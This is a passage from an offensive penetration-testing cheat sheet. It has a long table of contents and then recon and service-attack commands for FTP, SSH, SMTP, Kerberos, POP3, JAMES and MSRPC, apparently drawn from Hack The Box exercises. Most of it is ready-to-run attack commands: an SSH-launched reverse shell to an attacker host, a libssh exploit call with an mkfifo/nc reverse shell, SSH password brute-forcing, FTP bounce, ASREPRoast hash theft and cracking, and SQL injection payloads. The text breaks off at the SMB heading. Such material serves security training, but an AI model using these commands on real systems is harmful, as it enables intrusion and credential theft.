## Table of Contents

* [Table of Contents](golden-file.md#table-of-contents)
* [**Great Resources**](#great-resources)
* [**Recon**](golden-file.md#recon)
  * [Enumeration AIO](golden-file.md#enumeration-aio)
  * [File enumeration](golden-file.md#file-enumeration)
    * [Common](golden-file.md#common)
    * [Disk files](golden-file.md#disk-files)
    * [Images](golden-file.md#images)
    * [Audio](golden-file.md#audio)
  * [Port 21 - FTP](golden-file.md#port-21---ftp)
  * [Port 22 - SSH](golden-file.md#port-22---ssh)
  * [Port 25 - Telnet](golden-file.md#port-25---telnet)
  * [Port 43 - Whois](golden-file.md#port-43---whois)
  * [Port 53 - DNS](golden-file.md#port-53---dns)
  * [Port 69 - UDP - TFTP](golden-file.md#port-69---udp---tftp)
  * [Port 79 - Finger](golden-file.md#port-79---finger)
  * [Kerberos - 88](golden-file.md#kerberos---88)
  * [Port 110 - Pop3](golden-file.md#port-110---pop3)
  * [Port 111 - Rpcbind](golden-file.md#port-111---rpcbind)
  * [Port 119/4555 - NNTPD JAMES](golden-file.md#port-1194555---nntpd-james)
  * [Port 135 - MSRPC](golden-file.md#port-135---msrpc)
  * [Port 139/445 - SMB](golden-file.md#port-139445---smb)
  * [Port 161/162 UDP - SNMP](golden-file.md#port-161162-udp---snmp)
  * [LDAP - 389,636](golden-file.md#ldap---389636)
  * [HTTPS - 443](golden-file.md#https---443)
  * [500 - ISAKMP IKE](golden-file.md#500---isakmp-ike)
  * [513 - Rlogin](golden-file.md#513---rlogin)
  * [541 - FortiNet SSLVPN](golden-file.md#541---fortinet-sslvpn)
  * [Port 554 - RTSP](golden-file.md#port-554---rtsp)
  * [Port Rsync - 873/8730](golden-file.md#port-rsync---8738730)
  * [Port 1030/1032/1033/1038](golden-file.md#port-1030103210331038)
  * [MSSQL - 1433](golden-file.md#mssql---1433)
  * [Port 1521 - Oracle](golden-file.md#port-1521---oracle)
  * [Port 2049 - NFS](golden-file.md#port-2049---nfs)
  * [Port 2100 - Oracle XML DB](golden-file.md#port-2100---oracle-xml-db)
  * [3306 - MySQL](golden-file.md#3306---mysql)
  * [Port 3339 - Oracle web interface](golden-file.md#port-3339---oracle-web-interface)
  * [RDP - 3389](golden-file.md#rdp---3389)
  * [WinRM - 5985](golden-file.md#winrm---5985)
  * [VNC - 5900](golden-file.md#vnc---5900)
  * [Redis - 6379](golden-file.md#redis---6379)
  * [Port 6697 - IRC](golden-file.md#port-6697---irc)
  * [MsDeploy - 8172](golden-file.md#msdeploy---8172)
  * [Port 11211 - Memcached](golden-file.md#port-11211---memcached)
  * [Webdav](golden-file.md#webdav)
  * [Unknown ports](golden-file.md#unknown-ports)
  * [Port 80 - Web server](golden-file.md#port-80---web-server)
    * [Url brute force](golden-file.md#url-brute-force)
    * [Default/Weak login](golden-file.md#defaultweak-login)
    * [LFI/RFI](golden-file.md#lfirfi)
    * [SQLi](golden-file.md#sqli)
    * [XSS](golden-file.md#xss-port-80)
    * [Sql-login-bypass](golden-file.md#sql-login-bypass)
    * [Bypass image upload restrictions](golden-file.md#bypass-image-upload-restrictions)
    * [CeWL](golden-file.md#cewl)
  * [Password brute force - last resort](golden-file.md#password-brute-force---last-resort)
* [**Vulnerability analysis**](golden-file.md#vulnerability-analysis)
  * [BOF](golden-file.md#bof)
  * [Find xploits - Searchsploit and google](golden-file.md#find-xploits---searchsploit-and-google)
  * [Reverse Shells](golden-file.md#reverse-shells)
  * [Elastix and vtigercrm ](golden-file.md#elastix-and-vtigercrm)
  * [NVMS](golden-file.md#nvms)
  * [Magento](golden-file.md#magento)
  * [phpLiteAdmin](golden-file.md#phpliteadmin)
  * [Squid Server Proxy](golden-file.md#squid-server-proxy)
  * [Apache and Tomcat](golden-file.md#apache-and-tomcat)
  * [Zip Slip](golden-file.md#zip-slip)
  * [Gogs](golden-file.md#gogs)
  * [Portainer](golden-file.md#portainer)
  * [Bludit](golden-file.md#bludit)
  * [OpenEMR](golden-file.md#openemr)
  * [Spring Boot](golden-file.md#spring-boot)
* [**Privilege escalation**](golden-file.md#privilege-escalation)
  * [Common](golden-file.md#common-1)
    * [Set up Webserver](golden-file.md#set-up-webserver)
    * [Set up FTP Server](golden-file.md#set-up-ftp-server)
    * [Set up TFTP](golden-file.md#set-up-tftp)
    * [Upgrade Shell](golden-file.md#upgrade-shell)
    * [Insecure Functions](golden-file.md#insecure-functions)
    * [Alternate Data Stream](golden-file.md#alternate-data-stream)
    * [Port Knocking](golden-file.md#port-knocking)
    * [LTrace](golden-file.md#ltrace)
    * [NTDS](golden-file.md#ntds)
    * [wget](golden-file.md#wget)
    * [Git](golden-file.md#git)
    * [Ethereum](golden-file.md#ethereum)
    * [IPFS](golden-file.md#ipfs)
  * [Linux](golden-file.md#linux)
    * [Useful commands](golden-file.md#useful-commands)
    * [Basic info](golden-file.md#basic-info)
    * [Kernel exploits](golden-file.md#kernel-exploits)
    * [Programs running as root](golden-file.md#programs-running-as-root)
    * [Installed software](golden-file.md#installed-software)
    * [Weak/reused/plaintext passwords](golden-file.md#weakreusedplaintext-passwords)
    * [Inside service](golden-file.md#inside-service)
    * [Suid misconfiguration](golden-file.md#suid-misconfiguration)
    * [Unmounted filesystems](golden-file.md#unmounted-filesystems)
    * [Cronjob](golden-file.md#cronjob)
    * [SSH Keys](golden-file.md#ssh-keys)
    * [Bad path configuration](golden-file.md#bad-path-configuration)
    * [Find plain passwords](golden-file.md#find-plain-passwords)
    * [Scripts](golden-file.md#scripts)
      * [SUID](golden-file.md#suid)
      * [PS Monitor for cron](golden-file.md#ps-monitor-for-cron)
    * [Linux Privesc Tools](golden-file.md#linux-privesc-tools)
    * [Linux Precompiled Exploits](golden-file.md#linux-precompiled-exploits)
    * [Nohup](golden-file.md#nohup)
    * RedHat / CentOS
    * [GTFObins](golden-file.md#gtfobins)
    * [chkrootkit](golden-file.md#chkrootkit)
    * [WildCards](golden-file.md#wildcards)
    * [Debian OpenSSL Predictable PRNG](golden-file.md#debian-openssl-predictable-prng)
    * [Slack Space](golden-file.md#slack-space)
    * [NodeJS npm](golden-file.md#nodejs-npm)
    * [SUDO](golden-file.md#sudo)
    * [lxc / lxd](golden-file.md#lxc-/-lxd)
  * [Windows](golden-file.md#windows)
    * [Basic info](golden-file.md#basic-info-1)
    * [Kernel exploits](golden-file.md#kernel-exploits-1)
    * [Cleartext passwords](golden-file.md#cleartext-passwords)
    * [Reconfigure service parameters](golden-file.md#reconfigure-service-parameters)
    * [Dump process for passwords](golden-file.md#dump-process-for-passwords)
    * [Inside service](golden-file.md#inside-service-1)
    * [Programs running as root/system](golden-file.md#programs-running-as-rootsystem)
    * [Installed software](golden-file.md#installed-software-1)
    * [Scheduled tasks](golden-file.md#scheduled-tasks)
    * [Weak passwords](golden-file.md#weak-passwords)
    * [Add user and enable RDP](golden-file.md#add-user-and-enable-rdp)
    * [Powershell sudo for Windows](golden-file.md#powershell-sudo-for-windows)
      * [Powershell Method 1](golden-file.md#powershell-method-1)
      * [Powershell Method 2](golden-file.md#powershell-method-2)
    * [Windows download with bitsadmin](golden-file.md#windows-download-with-bitsadmin)
    * [Windows download with certutil.exe](golden-file.md#windows-download-with-certutilexe)
    * [Windows download with powershell](golden-file.md#windows-download-with-powershell)
    * [Windows Download from FTP](golden-file.md#windows-download-from-ftp)
    * [Windows create SMB Server transfer files](golden-file.md#windows-create-smb-server-transfer-files)
    * [Windows download with VBS](golden-file.md#windows-download-with-vbs)
    * [Windowss XP SP1 PrivEsc](golden-file.md#windowss-xp-sp1-privesc)
    * [Pass The Hash](golden-file.md#pass-the-hash)
    * [Scripts](golden-file.md#scripts-1)
      * [Useradd](golden-file.md#useradd)
      * [Powershell Run As](golden-file.md#powershell-run-as)
      * [Powershell Reverse Shell](golden-file.md#powershell-reverse-shell)
      * [Powershell Non-interactive Execute Powershell File](golden-file.md#powershell-non-interactive-execute-powershell-file)
    * [Windows privesc/enum tools](golden-file.md#windows-privescenum-tools)
    * [Windows precompiled exploits](golden-file.md#windows-precompiled-exploits)
    * [Windows Port Forwarding](golden-file.md#windows-port-forwarding)
    * [Windows DnsAdmins and Explotation of DLL](golden-file.md#windows-dnsadmins-and-explotation-of-dll)
    * [See Users and Objects Eliminated From AD](golden-file.md#see-users-and-objects-eliminated-from-ad)
    * [Dump Passwords Hashes from Active Directory](golden-file.md#dump-passwords-hashes-from-active-directory)
    * [Azure AD](golden-file.md#azure-ad)
* [**Loot**](golden-file.md#loot)
  * [Linux](golden-file.md#linux-1)
    * [Proof](golden-file.md#proof)
    * [Network secret](golden-file.md#network-secret)
    * [Passwords and hashes](golden-file.md#passwords-and-hashes)
    * [Dualhomed](golden-file.md#dualhomed)
    * [Tcpdump](golden-file.md#tcpdump)
    * [Interesting files](golden-file.md#interesting-files)
    * [Databases](golden-file.md#databases)
    * [SSH-Keys](golden-file.md#ssh-keys-1)
    * [Browser](golden-file.md#browser)
    * [Mail](golden-file.md#mail)
    * [GUI](golden-file.md#gui)
    * [ShellShock](golden-file.md#shellshock)
    * [Grep](golden-file.md#grep)
  * [Windows](golden-file.md#windows-1)
    * [Proof](golden-file.md#proof-1)
    * [Passwords and hashes](golden-file.md#passwords-and-hashes-1)
    * [Dualhomed](golden-file.md#dualhomed-1)
    * [Tcpdump](golden-file.md#tcpdump-1)
    * [Interesting files](golden-file.md#interesting-files-1)
    * [VNC Crack Server Encrypted Password](golden-file.md#vnc-crack-server-encrypted-password)
    * [Decompile Binaries](golden-file.md#decompile-binaries)
    * [CMD Hijacking](golden-file.md#cmd-hijacking)
* [**Data Bases Tips**](golden-file.md#data-bases-tips)
  * [SQLite3](golden-file.md#sqlite3)
  * [MySQL Dump](golden-file.md#mysql-dump)
  * [Mongo DB](golden-file.md#mongo-db)
* [**Web**](golden-file.md#web)
  * [SSL and TLS](#ssl-and-tls)
  * [Authentication](#authentication)
  * [HTML Parameter Pollution](golden-file.md#html-parameter-pollution-hpp)
  * [Fuzzing Directories](golden-file.md#fuzzing-directories)
  * [HTML Injection](golden-file.md#html-injection)
  * [XSS](golden-file.md#xss)
  * [CORS](golden-file.md#cors)
  * [Scanners](golden-file.md#scanners)
  * [Business Logic](golden-file.md#business-logic)
  * [Change HTPP Methods and Headers](#change-http-methods-and-headers)
  * [PHP Type Juggling](golden-file.md#php-type-juggling)
  * [Host Header Injection](golden-file.md#host-header-injection)
  * [Adobe AEM Flush Cache Dispatcher](golden-file.md#adobe-aem-flush-cache-dispatcher)
  * [Open Redirection](golden-file.md#open-redirection)
  * [Parameter Tampering](golden-file.md#parameter-tampering)
  * [File Inclusion](golden-file.md#file-inclusion)
  * [Missing Insufficient SPF Record](golden-file.md#missing-insufficient-spf-record)
  * [External Service Interaction DNS](golden-file.md#external-service-interaction-dns)
  * [SSRF](golden-file.md#ssrf)
  * [Critical File and Source Code Disclosure](golden-file.md#critical-file-and-source-code-disclosure)
  * [CSRF](golden-file.md#csrf)
  * [SQLite Injection](#sqlite-injection)
  * [SQL Injection](golden-file.md#sql-injection)
  * [OS Command Injection](#os-command-injection)
  * [XXE](golden-file.md#xxe)
  * [PHPinfo Injection](golden-file.md#phpinfo-injection)
  * [SSTI](golden-file.md#ssti)
  * [JWT](golden-file.md#jwt)
  * [Heartbleed](golden-file.md#heartbleed)
  * [cURL](golden-file.md#curl)
  * [CMS](golden-file.md#cms)
  * [Google Dorks](golden-file.md#google-dorks)
  * [Information Disclosure](golden-file.md#information-disclosure)
  * [HTTP Request Smuggling](#http-request-smuggling)
  * [Bypass WAF](#bypass-waf)
  * [XML RPC](#xml-rpc)
  * [OAuth 2.0](golden-file.md#oauth-20)
  * [JSON Injection](#json-injection)
  * [CRLF](#crlf)
* [**Cryptography**](golden-file.md#cryptography)
  * [Identify Cipher](golden-file.md#identify-cipher)
  * [Ciphers](golden-file.md#ciphers)
    * [AES](golden-file.md#aes)
    * [ECC](golden-file.md#ecc)
    * [Vigenere](golden-file.md#vigenere)
* [**Stego**](golden-file.md#stego)
  * [Tools](golden-file.md#tools)
    * [steghide](golden-file.md#steghide)
    * [stegpy](golden-file.md#stegpy)
    * [bpstegano](golden-file.md#bpstegano)
    * [foremost](golden-file.md#foremost)
    * [stegsolve](golden-file.md#stegsolve)
    * [strings](golden-file.md#strings)
    * [exiftool](golden-file.md#exiftool)
    * [exiv2](golden-file.md#exiv2)
    * [binwalk](golden-file.md#binwalk)
    * [zsteg](golden-file.md#zsteg)
    * [wavsteg](golden-file.md#wavsteg)
    * [sonic visualizer](golden-file.md#sonic-visualizer)
    * [hexeditor](golden-file.md#hexeditor)
    * [turgen system](golden-file.md#turgen-system)
    * [rabin2](golden-file.md#rabin2)
  * [Techniques](golden-file.md#techniques)
    * [GIF by frames](golden-file.md#gif-by-frames)
    * [Scan entropy](golden-file.md#scan-entropy)
    * [BAR & QR code ](golden-file.md#bar-&-qr-code)
    * [DNA code](golden-file.md#dna-code)
    * [Magic Numbers](golden-file.md#magic-numbers)
    * [Decode WAV file with TurgenSystem](golden-file.md#decode-wav-file-with-turgensystem)
    * [Binary Data to Image PNG](golden-file.md#binary-data-to-image-png)
  * [Brute Force in Image, ZIP, Audio](golden-file.md#brute-force-in-image-zip-audio)
    * [Stegcracker](golden-file.md#stegcracker)
    * [fcrackzip](golden-file.md#fcrackzip)
  * [Online Decoders](golden-file.md#online-decoders)
    * [Unicode Text Steganography](golden-file.md#unicode-text-steganography)
    * [npiet](golden-file.md#npiet)
    * [dcode fr](golden-file.md#dcode-fr)
    * [Cyber Chef](golden-file.md#cyber-chef)
    * [Cipher Identifier](golden-file.md#cipher-identifier)
    * [Quipqiup](golden-file.md#quipqiup)
* [**Forensic**](golden-file.md#forensic)
  * [Tools](golden-file.md#tools-forensics)
    * [Volatility](golden-file.md#volatility)
* [**Python**](golden-file.md#python)
  * [Web Scraping](golden-file.md#web-scraping)
  * [Functions Vulnerable](golden-file.md#functions-vulnerable)
* [**Brute Force ALL**](golden-file.md#brute-force-all)
* [**MSFVenom Payloads**](golden-file.md#msfvenom-payloads)
* [**Mobile**](golden-file.md#mobile)
  * [Android](golden-file.md#android)
    * [Extract APK](golden-file.md#extract-apk)
    * [Compile and Decompile APK](golden-file.md#compile-and-decompile-apk)
    * [Verify Checksum](golden-file.md#verify-checksum)
    * [Verify Certificate](golden-file.md#verify-certificate)
    * [Generate Certificate](golden-file.md#generate-certificate)
    * [Sign and Verify Certificate](golden-file.md#sign-and-verify-certificate)
    * [Android Manifest](golden-file.md#android-manifest)
    * [Drozer](golden-file.md#drozer)
    * [Static Analysis](golden-file.md#static-analysis)
    * [Search with GREP](golden-file.md#search-with-grep)
    * [Analysis of Classes](golden-file.md#analysis-of-classes)
    * [See Confidential Data](golden-file.md#see-confidential-data)
    * [Random Number Generator](golden-file.md#random-number-generator)
  * [iOS](golden-file.md#iOS)
* [**OSINT**](golden-file.md#osint)
  * [Elastic Search OSINT](golden-file.md#elastic-search-osint)
  * [Dorks for OSINT](golden-file.md#dorks-for-osint)
  * [Find Subdomains](golden-file.md#find-subdomains)
  * [Search Engines](#search-engines)
  * [Find People](#find-people)
* [**API Security**](golden-file.md#api-security)
  * [Search API Documentation](golden-file.md#search-api-documentation)
  * [Invalid ContentType](golden-file.md#invalid-contenttype)
* [**Segmentation Firewall Evasion**](#segmentation-firewall-evasion)
  * [ICMP Scan](#icmp-scan)
  * [Crafteo de paquetes UDP](#crafteo-de-paquetes-udp)
  * [DECOY](#decoy)
  * [Fragmentacion de Paquetes](#fragmentacion-de-paquetes)
  * [MTU](#mtu)
  * [Bad Checksums](#bad-checksums)
  * [IDL Zombie Scan](#idl-zombie-scan)
  * [Source port number specification](#source-port-number-specification)
  * [Append Random Data](#append-random-data)
  * [MAC Address Spoofing](#mac-address-spoofing)
  * [Flooding TCP](#flooding-tcp)
  * [Flooding UDP](#flooding-udp)
  * [Address IPv4 in Decimal, Octal and Hexadecimal](#address-ipv4-in-decimal-,-octal-and-hexadecimal)
* [**WiFi**](#wifi)
  * [See passwords clean](#see-passwords-clean)
* [**Maps Of Attacks**](#maps-of-attacks)
  * [CheckPoint](#checkpoint)
  * [Fortinet](#fortinet)
* [**Radio**](#radio)
  * [GQRX](#gqrx)
  * [ooktools](#ooktools)
## Great Resources
```
https://github.com/Voorivex/pentest-guide
```




## **Recon**

```text
=== Enumerate subnet ===
nmap -sn 10.11.1.1/24


=== Fast simple scan ===
nmap -sS 10.11.1.111
masscan -e tun0 --open -p1-65535 --max-rate 1000 <IP>


=== Full complete slow scan with output ===
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

=== Scan Ipv6 ===

nmap -6 -sC -sV -T4 -p- <ip_victim>
nmap -6 -sC -sV -T4 -p- dead:beef::250:56ff:feb9:f653


=== Autorecon ===
python3 autorecon.py 10.11.1.111

=== OneTwoPunch ===
https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
onetwopunch.sh ip.txt tcp


=== Scan for UDP ===
nmap 10.11.1.111 -sU
unicornscan -mU -v -I 10.11.1.111
masscan -pU:1-65535 10.10.10.x --rate=1000 -e tun0

=== Connect to udp if one is open ===
nc -u 10.11.1.111 48772


=== Responder ===
responder -I eth0 -A


=== Amass ===
amass enum -ip 10.11.1.1/24

=================================
=== Ping Sweep (without NMAP) ===
=================================

for i in {1..254}; do (ping -c 1 172.20.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;

====================================
=== Fast TCP Scan Host with Bash ===
====================================

#!/bin/bash

for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 <X.X.X.$i>" >/dev/null && echo "Host <X.X.X.$i> is ACTIVE" &
done; wait

        |||||||||||||||||||||||||||
        ||| With "echo" command |||
        |||||||||||||||||||||||||||

echo '#!/bin/bash
for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 <X.X.X.$i>" /dev/null && echo "Host <X.X.X.$i> is ACTIVE" &
done; wait' > hostScanner.sh

====================================
=== Fast TCP Scan Port with Bash ===
====================================

#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo > /dev/tcp/<X.X.X.X>/$port" 2>/dev/null && echo "Port $port - OPEN" &
done; wait

        |||||||||||||||||||||||||||
        ||| With "echo" command |||
        |||||||||||||||||||||||||||

echo '#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo > /dev/tcp/<X.X.X.X>/$port" 2>/dev/null && echo "Port $port - OPEN" &
done; wait' > portScanner.sh

        |||||||||||||||||||||||||
        ||| With "nc" command |||
        |||||||||||||||||||||||||

nc -zv 192.168.0.1 1-65535 &> results && cat results | grep succeeded
```

* sparta
* `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`

### Enumeration AIO

[Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)

### File enumeration

#### Common

```bash
# Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

#### Disk files

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

#### Images

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg
```

#### Audio

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f && cat output.txt #AudioStego
```

### Port 21 - FTP

```text
# Run some scans

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111

==================
=== FTP Bounce ===
==================

# If you see a message relationated to "This server supports FXP transfers" when you connect to FTP Server, it's vulnerable to FTP Bounce Attack

nmap -v -b name:password@FTP-Address Target-Address -Pn -P0
nmap -Pn -p8725-8735 -b admin:p4ssw0rd@10.10.10.156 127.0.0.1 -P0

NOTE: If you need know the ipv4 or ipv6 of your victim using FTP Server with FXP, please check Zetta box from HtB

# First with FTP

ftp > quote EPRT |2|dead:beef:2::1020|1234| (quote EPRT |2|<yourIpv6>|1234|)
ftp > quote list

# Second in your listener get the ipv4 or ipv6 correspondent

nc -lnvp 1234


Reference: zetta box (htb)
Resource: https://www.linux.org/threads/nmap-ftp-bounce-attack.4493/
```

### Port 22 - SSH

* If you have usernames test login with username:username
* Vulnerable Versions: 7.2p1

```bash
Vulnerable Versions: 7.2p1
nc 10.11.1.111 22

# Connect to another port

1) ssh -p 22022 sunny@10.10.10.76
ERROR: Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

2) ssh -p 22022 sunny@10.10.10.76 -oKexALgorithms=+diffie-hellman-group1-sha1


# Get reverse shell with SSH

ssh -p 22022 sunny@10.10.10.76 -oKexALgorithms=+diffie-hellman-group1-sha1 -t '/bin/bash -i >& /dev/tcp/<ip_attacker>/<port_attacker> 0>&1'

# Escape a "rbash" with SSH

ssh mindy@10.10.10.51 bash

Reference: solidstate box (htb)

# User can ask to execute a command right after authentication before it’s default command or shell is executed

ssh -v user@10.10.1.111 id

...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

Check Auth Methods:

$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

Force Auth Method:

$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

BruteForce:

patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'

patator ssh_login host=10.10.10.76 port=22022 user=FILE0 0=/root/Documentos/htb/box/borrar/user.txt password=FILE1 1=/usr/share/seclists/Passwords/probable-v2-top12000.txt -x ignore:fgrep='failed'

hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111

medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

SSH FUZZ
https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

SSH-AUDIT
https://github.com/arthepsy/ssh-audit

• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration                             
• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files                             

http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html


SSH Enum users < 7.7:
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"


# Copy a file from Victim to your Host

scp <user>@<ip>:/path/for/your/file /path/box/attacker (FROM YOUR HOST RUN THIS COMMAND)

root@cgonzalo:~/# scp charix@10.10.10.84:/home/charix/secret.zip /root/Documentos/htb/box/borrar


# SSH Tunneling

ssh -L <localPort>:<ipVictimLocal>:<portVictimForService> <user>@<ipVictim> (FROM ATTACKER BOX)
ssh -L 4444:127.0.0.1:5901 charix@10.10.10.84

# SSH Tunneling / Pivoting

sshuttle -vvr user@target 10.1.1.0/24

# Local port forwarding

ssh <gateway> -L <local port to listen>:<remote host>:<remote port>

# Remote port forwarding

ssh <gateway> -R <remote port to bind>:<local host>:<local port>

# Dynamic port forwarding

ssh -D <local proxy port> -p <remote port> <target>

# Plink local port forwarding

plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>

==========================================
=== SSH Agent Hijacking (ForwardAgent) ===
==========================================

# If you have one sceneario like this:

- You need to connect from A machine to C machine through B machine, forward agent can do that without password all time

Reference: ghoul box (htb)
Resource: https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/
```

### Port 25 - Telnet

```text
nc <ip> 25
nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

Send email unauth:

MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test

.

Receive:
250 OK

========================
=== Debbuging Server ===
========================

python -m smtpd -n -c DebuggingServer 10.10.14.34:25
```

### Port 43 - Whois

```text
# Test the service Whois

machine-attacker#: whois -h <victim_host> -p 43 google.com

# Test a domain

machine-attacker#: whois -h <victim_host> -p 43 supersechosting.htb

# Test a SQLi if the service have run a instance of DBMS

machine-attacker#: whois -h 10.10.10.155 -p 43 "supersechosting.htb'"
machine-attacker#: whois -h 10.10.10.155 -p 43 "supersechosting.htb') or '1'='1'#"
```

### Port 53 - DNS

```text
# Transfer Zone

dig axfr @<ip-victim> <domain>

host -l <domain> <ip-victim>
```

### Port 69 - UDP - TFTP

This is used for tftp-server.

* Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
* Checks of FTP Port 21.

```text
# NMAP

nmap -p69 --script=tftp-enum.nse 10.11.1.111

# Connect throught "tftp"

tftp <ip>
```

### Port 79 - Finger

```text
# User Enum

finger-user-enum.pl -U <wordlistUsername> -t <ip>

Resource: https://github.com/pentestmonkey/finger-user-enum
```

### Kerberos - 88

```text
- MS14-068

# ASREPRoast
The ASREPRoast attack is based on finding users who do not require Kerberos pre-authentication.

(LINUX) The following commands allow you to use a list of users or given a credential, perform an LDAP query to get users to attack on:

python GetNPUsers.py -dc-ip <ip> <domain>/ -usersfile <users.txt> -format <john/hashcat> -outputfile <hashesForCrack.asreproast>

And crack it:

john --wordlist=/usr/share/wordlists/rockyou.txt <hashesParaCrackear.asreproast>


Resource: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

# Users Enumeration

use auxiliary/gather/kerberos_enumusers
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP

# Brute Force Users

python kerbrute.py -dc-ip <ip> -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>


# CheatSheet Kerberos

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

# Resources

Resource: https://www.tarlogic.com/blog/como-funciona-kerberos/
Resource: https://www.tarlogic.com/blog/como-atacar-kerberos/
Resource: https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
```

### Port 110 - Pop3

```text
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```text
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
    querydispinfo (info about ALL)
```

### Port 119/4555 - NNTPD JAMES

```text
# Find vulnerabilities

searchsploit JAMES

# Connect

telnet <ip> <port>

telnet 10.10.10.51 4555
Login: root:root

help

listusers
setpassword <user> <new-passwd>

# Connect to 110 to check if any User have some file in your inbox

telnet 10.10.10.51 110
user <user>
pass <password-user>

# Found emails

list
+OK 1 743
1 743
.

# Get emails

retr <id-mail>
retr 1
```

### Port 135 - MSRPC

Some versions are vulnerable.

```text
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### Port 139/445 - SMB

```text
# Enumeration

